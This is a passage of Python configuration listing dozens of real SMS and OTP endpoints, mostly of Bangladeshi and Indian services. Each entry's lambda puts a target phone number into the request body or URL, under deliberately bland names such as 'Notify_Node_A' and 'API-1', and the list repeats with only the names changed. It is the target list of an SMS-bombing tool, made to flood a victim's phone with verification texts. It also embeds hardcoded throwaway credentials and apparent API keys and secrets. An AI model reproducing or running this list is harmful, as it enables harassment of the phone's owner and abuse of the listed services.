        "name": "Notify_Node_A",
        "type": "SMS",
        "url": "https://backend.timezonebd.com/api/v1/user/regnewcustomer",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"name":"Tusar","email":"fukc@gmail.com","phone":"{phone}","password":"aAeMY@5hG8iUfD4","password_confirmation":"aAeMY@5hG8iUfD4"}}'
    },
    {
        "name": "Notify_Node_B",
        "type": "SMS",
        "url": "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"device_uuid":"...","firebase_token":"...","geo_location":"...","mno":"Grameenphone","wallet_number":"{phone}"}}'
    },
    {
        "name": "Notify_Node_C",
        "type": "SMS",
        "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"number":"+880{phone}"}}'
    },
    {
        "name": "Notify_Node_D",
        "type": "SMS",
        "url": "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148.0.7778.178&os=Android&osv=12",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobile={phone}&fcmToken=&referral="
    },
    {
        "name": "Notify_Node_E",
        "type": "SMS",
        "url": "https://www.pkluck2.com/wps/verification/sms/noLogin",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNum":"{phone}","countryDialingCode":"880"}}'
    },
    {
        "name": "Notify_Node_F",
        "type": "SMS",
        "url": "https://applink.com.bd/appstore-v4-server/login/otp/request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"msisdn":"880{phone}"}}'
    },
    {
        "name": "Notify_Node_G",
        "type": "SMS",
        "url": "https://newprod.api-care-box.click:444/api/user/register/?version=otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"Name":"Abdullah Al Mamun","Phone":"+880{phone}"}}'
    },
    {
        "name": "Notify_Node_H",
        "type": "SMS",
        "url": "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_no":"{phone}"}}'
    },
    {
        "name": "Notify_Node_I",
        "type": "SMS",
        "url": "https://www.jayabajibd.life/api/register/confirm",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileno":"{phone}","username":"abffjddngf864","firstname":"","new_password":"tPNVOcen!6XEz3b","confirm_new_password":"tPNVOcen!6XEz3b","country_code":"880","country":"BD","currency":"BDT","ref":"","language":"en"}}'
    },
    {
        "name": "Notify_Node_J",
        "type": "SMS",
        "url": "https://api.swap.com.bd/api/v1/send-otp/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Notify_Node_K",
        "type": "SMS",
        "url": "https://apiv1.bdtickets.com/api/v1/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"+880{phone}"}}'
    },
    {
        "name": "Notify_Node_L",
        "type": "SMS",
        "url": "https://ss.binge.buzz/otp/send/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Notify_Node_M",
        "type": "SMS",
        "url": "https://sendmysms.net/send-otp.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phonenumber={phone}"
    },
    {
        "name": "Notify_Node_N",
        "type": "SMS",
        "url": "https://api.shikho.com/auth/v2/send/sms",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"auth_type":"login","phone":"{phone}","vendor":"shikho","type":"student"}}'
    },
    {
        "name": "Notify_Node_O",
        "type": "SMS",
        "url": "https://app.eonbazar.com/api/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"method":"otp","mobile":"{phone}"}}'
    },
    {
        "name": "Notify_Node_P",
        "type": "SMS",
        "url": "http://nesco.sslwireless.com/api/v1/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone_number":"{phone}"}}'
    },
    {
        "name": "Notify_Node_Q",
        "type": "SMS",
        "url": "https://developer.quizgiri.xyz/api/v2.0/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"country_code":"+880","phone":"{phone}"}}'
    },
    {
        "name": "Notify_Node_R",
        "type": "SMS",
        "url": "https://www.bazar365.store/api/v1/auth/sendPhoneOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","applicationChannel":"WEB_APP"}}'
    },
    {
        "name": "Notify_Node_S",
        "type": "SMS",
        "url": "https://www.bioscopelive.com/en/login/send-otp?phone=880{phone}&operator=bd-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","applicationChannel":"WEB_APP"}}'
    },
    {
        "name": "Service-Alpha",
        "type": "SMS",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Endpoint-101",
        "type": "SMS",
        "url": lambda phone: f"https://apu-inky.vercel.app/send?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Gateway-Blue",
        "type": "SMS",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'
    },
    {
        "name": "SMS-Node-A",
        "type": "SMS",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'
    },
    {
        "name": "Route-7",
        "type": "SMS", 
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'
    },
    {
        "name": "Relay-X",
        "type": "SMS",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","city":362}}'
    },
    {
        "name": "Channel-Zero",
        "type": "SMS",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","email":"test@example.com"}}'
    },
    {
        "name": "Auth-Module-1",
        "type": "SMS",
        "url": "https://api.myhubble.money/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}","channel":"SMS"}}'
    },
    {
        "name": "Gateway-Beta",
        "type": "SMS",
        "url": "https://login.housing.com/api/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'
    },
    {
        "name": "SMS-Hub-99",
        "type": "SMS",
        "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Request-Pipe-X",
        "type": "SMS",
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}'
    },
    {
        "name": "Notify-Stream",
        "type": "SMS",
        "url": "https://animall.in/zap/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}'
    },
    {
        "name": "Packet-Sender-1",
        "type": "SMS",
        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}'
    },
    {
        "name": "Client-Call-3",
        "type": "SMS",
        "url": "https://jiffy.spencers.in/user/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },

    # --- GET Method APIs ---
    {
        "name": "Fetch-Link-01",
        "type": "SMS",
        "url": lambda phone: f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Service-GP-One",
        "type": "SMS",
        "url": lambda phone: f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{phone}&lang=en&ng=0",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Web-Handler-A",
        "type": "SMS",
        "url": lambda phone: f"https://auth.shukhee.com/register?mobile=+88{phone}&_rsc=1jwvn",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Direct-Get-5",
        "type": "SMS",
        "url": lambda phone: f"https://api.medeasy.health/api/send-otp/+88{phone}/",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Script-Target-9",
        "type": "SMS",
        "url": lambda phone: f"http://ultranetrn.com.br/fonts/api.php?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Query-Line-B",
        "type": "SMS",
        "url": lambda phone: f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Stream-Get-V2",
        "type": "SMS",
        "url": lambda phone: f"https://ss.binge.buzz/otp/send/login{phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Fast-Fetch-12",
        "type": "SMS",
        "url": lambda phone: f"https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88{phone}&platform=app&activity=login",
        "method": "GET",
        "headers": {},
        "data": None
    },

    # --- POST Method APIs ---
    {
        "name": "Server-Post-11",
        "type": "SMS",
        "url": "https://app.deshal.net/api/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Service-GP-Two",
        "type": "SMS",
        "url": "https://weblogin.grameenphone.com/backend/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"msisdn":"{phone}"}}'
    },
    {
        "name": "Service-GP-Three",
        "type": "SMS",
        "url": "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","email":"","language":"en"}}'
    },
    {
        "name": "Payload-Push-X",
        "type": "SMS",
        "url": "https://api.busbd.com.bd/api/auth",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"+88{phone}"}}'
    },
    {
        "name": "Form-Dispatcher",
        "type": "SMS",
        "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"full_name":"Apk","email_address":"apkzone2.0@gmail.com","company_name":"Ahgbd","phone_number":"{phone}"}}'
    },
    {
        "name": "Post-Relay-8",
        "type": "SMS",
        "url": "https://api.osudpotro.com/api/v1/users/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"+880{phone}","deviceToken":"web","language":"en","os":"web"}}'
    },
    {
        "name": "Outbound-SMS-22",
        "type": "SMS",
        "url": "https://api.apex4u.com/api/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'
    },
    {
        "name": "Session-Init-9",
        "type": "SMS",
        "url": "https://bb-api.bohubrihi.com/public/activity/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","intent":"login"}}'
    },
    {
        "name": "Trigger-Point-C",
        "type": "SMS",
        "url": "https://fundesh.com.bd/api/auth/generateOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"msisdn":"{phone}"}}'
    },
    {
        "name": "Request-Gateway-4",
        "type": "SMS",
        "url": "https://user-api.jslglobal.co/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"+88{phone}","jatri_token":"J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}}'
    },
    {
        "name": "Backend-Call-A",
        "type": "SMS",
        "url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"+88{phone}"}}'
    },
    {
        "name": "Sender-Bot-007",
        "type": "SMS",
        "url": "https://apix.rabbitholebd.com/appv2/login/requestOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"+88{phone}"}}'
    },
    {
        "name": "Data-Forwarder-5",
        "type": "SMS",
        "url": "https://auth.qcoom.com/api/v1/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"+88{phone}"}}'
    },
    {
        "name": "SMS-Port-8080",
        "type": "SMS",
        "url": "https://api.garibookadmin.com/api/v4/user/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"+880{phone}","recaptcha_token":"garibookcaptcha","channel":"web"}}'
    },
    {
        "name": "System-Sender-01",
        "type": "SMS",
        "url": "https://training.gov.bd/backoffice/api/user/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "API-Connector-X",
        "type": "SMS",
        "url": "https://api.shikho.com/public/activity/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","intent":"ap-discount-request"}}'
    },
    {
        "name": "Reg-Handler-V3",
        "type": "SMS",
        "url": "https://core.easy.com.bd/api/v1/registration",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"name":"Tusar","email":"apkzone2.0info@gmail.com","mobile":"{phone}","password":"amitusar","password_confirmation":"amitusar","device_key":"b2c8ddd3be..."}}'
    },
    {
        "name": "Telco-Bridge-R",
        "type": "SMS",
        "url": "https://da-api.robi.com.bd/da-nll/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"msisdn":"{phone}"}}'
    },
    {
        "name": "Media-Auth-Sink",
        "type": "SMS",
        "url": "https://prod-api.viewlift.com/identity/signup?site=hoichoitv",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}","requestType":"send","emailConsent":true,"whatsappConsent":true}}'
    },
    {
        "name": "App-Gateway-99",
        "type": "SMS",
        "url": "https://app.addatimes.com/api/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country_code":"BD"}}'
    },
    {
        "name": "Auth-Pipe-Alpha",
        "type": "SMS",
        "url": "https://regalfurniturebd.com/api/auth/otp-generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","verification_code":""}}'
    },
    {
        "name": "Auth-Pipe-Beta",
        "type": "SMS",
        "url": "https://regalfurniturebd.com/api/auth/register",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"name":"User","email":"user@example.com","phone":"{phone}","password":"password123"}}'
    },
    {
        "name": "Stream-Auth-BD",
        "type": "SMS",
        "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"email":"apkzone2.0@gmail.com","phone_number":"88{phone}"}}'
    },
    {
        "name": "Time-Node-1",
        "type": "SMS",
        "url": "https://backend.timezonebd.com/api/v1/user/otp-request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Time-Node-2",
        "type": "SMS",
        "url": "https://backend.timezonebd.com/api/v1/user/regnewcustomer",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"name":"Tusar","email":"fukc@gmail.com","phone":"{phone}","password":"aAeMY@5hG8iUfD4","password_confirmation":"aAeMY@5hG8iUfD4"}}'
    },
    {
        "name": "Wallet-Verify-0",
        "type": "SMS",
        "url": "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"device_uuid":"...","firebase_token":"...","geo_location":"...","mno":"Grameenphone","wallet_number":"{phone}"}}'
    },
    {
        "name": "Dynamic-Auth-X",
        "type": "SMS",
        "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"number":"+880{phone}"}}'
    },
    {
        "name": "Form-Encoder-2",
        "type": "SMS",
        "url": "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148.0.7778.178&os=Android&osv=12",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobile={phone}&fcmToken=&referral="
    },
    {
        "name": "Verify-Link-77",
        "type": "SMS",
        "url": "https://www.pkluck2.com/wps/verification/sms/noLogin",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNum":"{phone}","countryDialingCode":"880"}}'
    },
    {
        "name": "App-Store-Server",
        "type": "SMS",
        "url": "https://applink.com.bd/appstore-v4-server/login/otp/request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"msisdn":"880{phone}"}}'
    },
    {
        "name": "Secure-Box-A",
        "type": "SMS",
        "url": "https://newprod.api-care-box.click:444/api/user/register/?version=otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"Name":"Abdullah Al Mamun","Phone":"+880{phone}"}}'
    },
    {
        "name": "Learn-Auth-3",
        "type": "SMS",
        "url": "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_no":"{phone}"}}'
    },
    {
        "name": "Confirm-Service-Z",
        "type": "SMS",
        "url": "https://www.jayabajibd.life/api/register/confirm",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileno":"{phone}","username":"abffjddngf864","firstname":"","new_password":"tPNVOcen!6XEz3b","confirm_new_password":"tPNVOcen!6XEz3b","country_code":"880","country":"BD","currency":"BDT","ref":"","language":"en"}}'
    },
    {
        "name": "Swap-Relay-V2",
        "type": "SMS",
        "url": "https://api.swap.com.bd/api/v1/send-otp/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Ticket-Gateway",
        "type": "SMS",
        "url": "https://apiv1.bdtickets.com/api/v1/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"+880{phone}"}}'
    },
    {
        "name": "Stream-Post-V1",
        "type": "SMS",
        "url": "https://ss.binge.buzz/otp/send/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Direct-SMS-Out",
        "type": "SMS",
        "url": "https://sendmysms.net/send-otp.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phonenumber={phone}"
    },
    {
        "name": "Edu-Auth-Dispatcher",
        "type": "SMS",
        "url": "https://api.shikho.com/auth/v2/send/sms",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"auth_type":"login","phone":"{phone}","vendor":"shikho","type":"student"}}'
    },
    {
        "name": "Eon-Login-Module",
        "type": "SMS",
        "url": "https://app.eonbazar.com/api/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"method":"otp","mobile":"{phone}"}}'
    },
    {
        "name": "Utility-SSL-Pipe",
        "type": "SMS",
        "url": "http://nesco.sslwireless.com/api/v1/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone_number":"{phone}"}}'
    },
    {
        "name": "Quiz-Endpoint-2",
        "type": "SMS",
        "url": "https://developer.quizgiri.xyz/api/v2.0/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"country_code":"+880","phone":"{phone}"}}'
    },
    {
        "name": "Store-Web-Channel",
        "type": "SMS",
        "url": "https://www.bazar365.store/api/v1/auth/sendPhoneOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","applicationChannel":"WEB_APP"}}'
    },
    {
        "name": "Live-Media-Operator",
        "type": "SMS",
        "url": "https://www.bioscopelive.com/en/login/send-otp?phone=880{phone}&operator=bd-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","applicationChannel":"WEB_APP"}}'
    },
    {
        "name": "API-1",
        "type": "SMS",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "API-2",
        "type": "SMS",
        "url": lambda phone: f"https://apu-inky.vercel.app/send?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "API-3",
        "type": "SMS",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'
    },
    {
        "name": "API-4",
        "type": "SMS",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'
    },
    {
        "name": "API-5",
        "type": "SMS", 
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'
    },
    {
        "name": "API-6",
        "type": "SMS",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","city":362}}'
    },
    {
        "name": "API-7",
        "type": "SMS",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","email":"test@example.com"}}'
    },
    {
        "name": "API-8",
        "type": "SMS",
        "url": "https://api.myhubble.money/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}","channel":"SMS"}}'
    },
    {
        "name": "API-9",
        "type": "SMS",
        "url": "https://login.housing.com/api/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'
    },
    {
        "name": "API-10",
        "type": "SMS",
        "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "API-11",
        "type": "SMS",
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}'
    },
    {
        "name": "API-12",
        "type": "SMS",
        "url": "https://animall.in/zap/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}'
    },
    {
        "name": "API-13",
        "type": "SMS",
        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}'
    },
    {
        "name": "API-14",
        "type": "SMS",
        "url": "https://jiffy.spencers.in/user/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },

    # --- GET Method APIs ---
    {
        "name": "API-15",
        "type": "SMS",
        "url": lambda phone: f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "API-16",
        "type": "SMS",
        "url": lambda phone: f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{phone}&lang=en&ng=0",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "API-17",
        "type": "SMS",
        "url": lambda phone: f"https://auth.shukhee.com/register?mobile=+88{phone}&_rsc=1jwvn",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "API-18",
        "type": "SMS",
        "url": lambda phone: f"https://api.medeasy.health/api/send-otp/+88{phone}/",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "API-19",
        "type": "SMS",
        "url": lambda phone: f"http://ultranetrn.com.br/fonts/api.php?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "API-20",
        "type": "SMS",
        "url": lambda phone: f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "API-21",
        "type": "SMS",
        "url": lambda phone: f"https://ss.binge.buzz/otp/send/login{phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "API-22",
        "type": "SMS",
        "url": lambda phone: f"https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88{phone}&platform=app&activity=login",
        "method": "GET",
        "headers": {},
        "data": None
    },

    # --- POST Method APIs ---
    {
        "name": "API-23",
        "type": "SMS",
        "url": "https://app.deshal.net/api/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "API-24",
        "type": "SMS",
        "url": "https://weblogin.grameenphone.com/backend/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"msisdn":"{phone}"}}'
    },
    {
        "name": "API-25",
        "type": "SMS",
        "url": "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","email":"","language":"en"}}'
    },
    {
        "name": "API-26",
        "type": "SMS",
        "url": "https://api.busbd.com.bd/api/auth",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"+88{phone}"}}'
    },
    {
        "name": "API-27",
        "type": "SMS",
        "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"full_name":"Apk","email_address":"apkzone2.0@gmail.com","company_name":"Ahgbd","phone_number":"{phone}"}}'
    },
    {
        "name": "API-28",
        "type": "SMS",
        "url": "https://api.osudpotro.com/api/v1/users/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"+880{phone}","deviceToken":"web","language":"en","os":"web"}}'
    },
    {
        "name": "API-29",
        "type": "SMS",
        "url": "https://api.apex4u.com/api/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'
    },
    {
        "name": "API-30",
        "type": "SMS",
        "url": "https://bb-api.bohubrihi.com/public/activity/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","intent":"login"}}'
    },
    {
        "name": "API-31",
        "type": "SMS",
        "url": "https://fundesh.com.bd/api/auth/generateOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"msisdn":"{phone}"}}'
    },
    {
        "name": "API-32",
        "type": "SMS",
        "url": "https://user-api.jslglobal.co/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
